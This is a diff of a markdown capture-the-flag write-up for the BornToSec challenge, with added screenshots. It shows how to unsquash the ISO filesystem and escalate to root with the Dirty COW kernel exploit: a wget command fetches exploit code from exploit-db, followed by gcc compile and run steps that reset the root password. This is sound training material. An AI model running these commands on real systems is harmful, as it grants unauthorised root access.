@@ -1,9 +1,10 @@
 ## Unsquash
 
-* To understand the file structure of the system that we need to Hack, we are going to open given BornToSec ISO file.<br/>
-![files_iso](screens/files_iso.png)
+* To understand the file structure of the system that we need to Hack, we are going to open given BornToSec ISO file.<br/><br/>
+![files_iso](screens/files_iso.png)<br/>
+![sqaushed_file](screens/sqaushed_file.png)<br/>
 * In casper folder we can see filesystem.squashfs which tells us that system is compessed. It also means that we can decompress system using linux `unsquashfs` function.<br/>
-![sqaushed_file](screens/sqaushed_file.png)
+![unsquash](screens/unsquash.jpg)<br/>
 You should have access as a laurie via ssh and use /tmp folder to unsqash the system file in /cdrom/casper/filesystem.squashfs
 
 -----------------------------------------------------------------------------------------
@@ -11,8 +12,8 @@ You should have access as a laurie via ssh and use /tmp folder to unsqash the sy
 
 ## Privilege escalation
 
-* We can access as a lower level user and try to user exisiting explits that will provide us with root access possbily. Exploits are possible for some versions of our system:
-
+* We can access as a lower level user and try to user exisiting explits that will provide us with root access possbily. Exploits are possible for some versions of our system<br/>
+![squash_kernel_version](screens/squash_kernel_version.jpg)
 * As we know we can execute scripts from tmp folder, only need to upload them there
 
 * There are an [existing script](https://github.com/sneakymonk3y/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh) that we are going to use which named [dirtycow2](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails), it fits perfectly our system version
@@ -27,7 +28,7 @@ The bug has existed since around 2.6.22 (released in 2007) and was fixed on Oct 
 * getting script `wget --no-check-certificate https://www.exploit-db.com/download/40839 -O dirty.c`
 
 * Giving 755 permissions to the dirty.c file and to compile with `gcc -pthread dirty.c -o dirty -lcrypt`
-
+![exploit](screens/exploit.jpg)
 * Then execute it and provide a new password for the root user, then just su root.
 
 * Done!
